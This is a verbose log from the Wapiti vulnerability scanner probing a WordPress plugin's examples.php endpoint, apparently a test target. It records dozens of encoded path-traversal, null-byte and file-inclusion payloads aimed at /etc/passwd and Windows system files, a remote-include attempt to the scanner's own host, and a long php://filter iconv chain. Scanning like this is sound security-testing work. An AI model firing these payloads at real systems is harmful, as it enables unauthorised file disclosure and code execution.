2024-03-21 16:04:52.587 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:52.714 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 16:04:52.714 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_915c2b6f.db
2024-03-21 16:04:52.718 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 16:04:52.771 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 16:04:52.771 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 16:04:52.877 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 16:04:52.877 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 16:04:52.877 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 16:04:52.916 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 16:04:52.933 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz
2024-03-21 16:04:52.937 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
2024-03-21 16:04:52.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
2024-03-21 16:04:52.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%2Fetc%2Fpasswd
2024-03-21 16:04:52.957 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%2Fetc%2Fpasswd%00
2024-03-21 16:04:52.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%2Fetc%2Fservices
2024-03-21 16:04:52.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=%2Fetc%2Fservices%00
2024-03-21 16:04:52.973 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
2024-03-21 16:04:52.978 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
2024-03-21 16:04:52.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
2024-03-21 16:04:52.987 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:52.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:52.997 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
2024-03-21 16:04:53.002 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
2024-03-21 16:04:53.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
2024-03-21 16:04:53.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.016 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.021 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.026 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.031 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.035 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.050 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.059 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
2024-03-21 16:04:53.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.078 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.086 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.092 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.096 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.105 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.110 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.115 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.119 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.124 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.132 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
2024-03-21 16:04:53.137 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.142 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.151 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
2024-03-21 16:04:53.156 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.160 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
2024-03-21 16:04:53.168 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.176 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.191 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=file%3A%2F%2F%2Fetc%2Fpasswd
2024-03-21 16:04:53.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
2024-03-21 16:04:53.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
2024-03-21 16:04:53.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
2024-03-21 16:04:53.229 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
2024-03-21 16:04:53.238 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
2024-03-21 16:04:53.248 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
2024-03-21 16:04:53.257 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
2024-03-21 16:04:53.266 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=examples.php
2024-03-21 16:04:53.275 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=examples.php%00
2024-03-21 16:04:53.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
	data: src=examples.php%3A%3A%24DATA
2024-03-21 16:04:53.316 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-21 16:04:53.345 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-21 16:04:53.370 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 16:04:53.384 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/wp-content/plugins/seo-local-rank/admin/vendor/datatables/examples/resources/examples.php (0)
